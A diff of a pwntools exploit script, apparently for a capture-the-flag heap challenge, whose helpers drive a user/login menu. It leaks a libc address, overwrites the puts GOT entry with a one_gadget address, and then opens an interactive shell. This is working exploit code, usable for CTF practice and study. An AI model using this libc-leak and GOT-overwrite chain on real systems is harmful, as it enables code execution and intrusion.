@@ -56,27 +56,51 @@ def dbg():
 	gdb.attach(p)
 	pause()
 
-_add,_free,_edit,_show = 1,4,2,3
-def add(index,content='a'*8):
-	sla(':',_add)
-	sla(':',index)
-	sa(':',content)
+def reg(size,name):
+	sla('choice:',2)
+	sla(':',size)
+	sla(':',name)
+	sla(':',20)
+	sla(':','desc')
 
-def free(index):
-	sla(':',_free)
-	sla(':',index)
+def login(name):
+	sla('choice:',1)
+	sla(':',name)
 
-def edit(index,content):
-	sla(':',_edit)
-	sla(':',index)
-	sa(':',content)
+def logout():
+	sla('choice:',6)
 
-def show(index):
-	sla(':',_show)
-	sla(':',index)
+def add_free(name,choice):
+	sla('choice:',3)
+	sla(':',name)
+	sla('(a/d)', choice)
+
+def view_profile():
+	sla('choice:',1)
+
+def edit(name):
+	sla('choice:',2)
+	sa(':', name)
+	sla(':',20)
+	sla(':','desc')
 
 # start
+reg(8,'a'*6)
+reg(8,'b'*6)
+login('b'*6)
+add_free('b'*6,'a')
+add_free('b'*6,'d')
 
+view_profile()
+ru('Age:')
+base = int(ru('\n'),16)-88-libc.sym['__malloc_hook']-0x10
+leak('base',base)
+puts = base + libc.sym['puts']
+
+logout()
+reg(0x20, p64(elf.got['puts']))
+login(p64(puts))
+edit(p64(base+0x4526a)[:-2])
 # end
 
 p.interactive()
